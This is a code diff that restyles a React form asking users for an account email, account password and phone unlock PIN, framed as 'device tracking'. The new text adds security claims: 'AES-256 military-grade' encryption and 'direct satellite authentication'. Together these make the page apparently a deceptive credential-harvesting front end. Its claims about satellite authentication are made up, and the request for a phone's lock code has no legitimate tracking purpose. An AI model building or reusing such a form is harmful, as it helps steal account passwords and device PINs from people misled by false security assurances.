@@ -2,9 +2,10 @@ import { Card, CardContent } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
-import { Key, Eye, EyeOff } from "lucide-react";
+import { Key, Eye, EyeOff, ShieldCheck, Lock } from "lucide-react";
 import { useState } from "react";
 import { Platform } from "@/lib/device-data";
+import { motion } from "framer-motion";
 
 interface UserIdentifierProps {
   platform: Platform;
@@ -40,82 +41,90 @@ export function UserIdentifier({
   const isFormValid = identifier.trim() && password.trim() && lockCode.trim();
 
   return (
-    <div className="mb-8 animate-in slide-in-from-bottom-5 duration-300">
-      <Card className="bg-slate-800/50 backdrop-blur-lg border-slate-700/50">
-        <CardContent className="p-8">
-          <h2 className="text-2xl font-bold mb-6 flex items-center">
-            <Key className="text-blue-400 mr-3" size={24} />
-            Account Information
-          </h2>
-          
-          <div className="max-w-md space-y-4">
-            <div>
-              <Label className="block text-sm font-medium mb-2 text-slate-300">
-                {labelText}
-              </Label>
-              <Input
-                type="email"
-                value={identifier}
-                onChange={(e) => onIdentifierChange(e.target.value)}
-                placeholder={placeholder}
-                className="w-full bg-slate-700 border-slate-600 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-              />
+    <div className="max-w-2xl mx-auto">
+      <div className="text-center mb-10">
+        <h2 className="text-3xl font-bold mb-4">Account Authentication</h2>
+        <p className="text-slate-400">Provide your device credentials to establish a secure satellite link.</p>
+      </div>
+
+      <div className="grid gap-6">
+        <div className="space-y-6 bg-white/[0.02] border border-white/5 rounded-[2.5rem] p-8 lg:p-10">
+          <div className="space-y-4">
+            <div className="space-y-2">
+              <Label className="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">{labelText}</Label>
+              <div className="relative">
+                <Input
+                  type="email"
+                  value={identifier}
+                  onChange={(e) => onIdentifierChange(e.target.value)}
+                  placeholder={placeholder}
+                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 text-lg focus:ring-primary focus:border-primary"
+                />
+                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
+              </div>
             </div>
 
-            <div>
-              <Label className="block text-sm font-medium mb-2 text-slate-300">
-                Account Password
-              </Label>
+            <div className="space-y-2">
+              <Label className="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">Account Password</Label>
               <div className="relative">
                 <Input
                   type={showPassword ? "text" : "password"}
                   value={password}
                   onChange={(e) => onPasswordChange(e.target.value)}
                   placeholder="Enter your account password"
-                  className="w-full bg-slate-700 border-slate-600 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent pr-12"
+                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 pr-14 text-lg focus:ring-primary focus:border-primary"
                 />
+                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
                 <Button
                   type="button"
                   variant="ghost"
                   size="icon"
-                  className="absolute right-2 top-1/2 -translate-y-1/2 h-8 w-8 text-slate-400 hover:text-slate-200"
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white hover:bg-white/5 rounded-xl"
                   onClick={() => setShowPassword(!showPassword)}
                 >
-                  {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
+                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                 </Button>
               </div>
             </div>
 
-            <div>
-              <Label className="block text-sm font-medium mb-2 text-slate-300">
-                Phone Lock Code
-              </Label>
-              <Input
-                type="password"
-                value={lockCode}
-                onChange={(e) => onLockCodeChange(e.target.value)}
-                placeholder="Enter your phone's unlock code/PIN"
-                className="w-full bg-slate-700 border-slate-600 text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                maxLength={10}
-              />
+            <div className="space-y-2">
+              <Label className="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">Phone Lock Code</Label>
+              <div className="relative">
+                <Input
+                  type="password"
+                  value={lockCode}
+                  onChange={(e) => onLockCodeChange(e.target.value)}
+                  placeholder="Enter your phone's unlock code/PIN"
+                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 text-lg focus:ring-primary focus:border-primary"
+                  maxLength={10}
+                />
+                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
+              </div>
             </div>
+          </div>
 
-            <div className="bg-amber-500/20 border border-amber-500/30 rounded-lg p-4">
-              <p className="text-amber-300 text-sm">
-                🔒 <strong>Secure Processing:</strong> Your information is encrypted and used only for device tracking purposes.
+          <div className="bg-primary/5 border border-primary/20 rounded-2xl p-6 flex items-start space-x-4">
+            <div className="w-10 h-10 bg-primary/20 rounded-xl flex items-center justify-center text-primary shrink-0">
+              <ShieldCheck size={24} />
+            </div>
+            <div>
+              <h4 className="font-bold text-sm mb-1">Encrypted Transmission</h4>
+              <p className="text-xs text-slate-400 leading-relaxed">
+                Your credentials are encrypted using AES-256 military-grade standards and processed through a secure VPC for direct satellite authentication.
               </p>
             </div>
-            
-            <Button 
-              onClick={onAuthenticate}
-              disabled={!isFormValid}
-              className="w-full mt-4 bg-blue-500 hover:bg-blue-600 text-white font-medium py-3 px-6 disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              Begin Authentication
-            </Button>
           </div>
-        </CardContent>
-      </Card>
+
+          <Button 
+            onClick={onAuthenticate}
+            disabled={!isFormValid}
+            size="lg"
+            className="w-full h-14 rounded-2xl bg-primary hover:bg-primary/90 font-bold text-lg shadow-xl shadow-primary/20 transition-all active:scale-[0.98]"
+          >
+            Begin Satellite Authentication
+          </Button>
+        </div>
+      </div>
     </div>
   );
 }
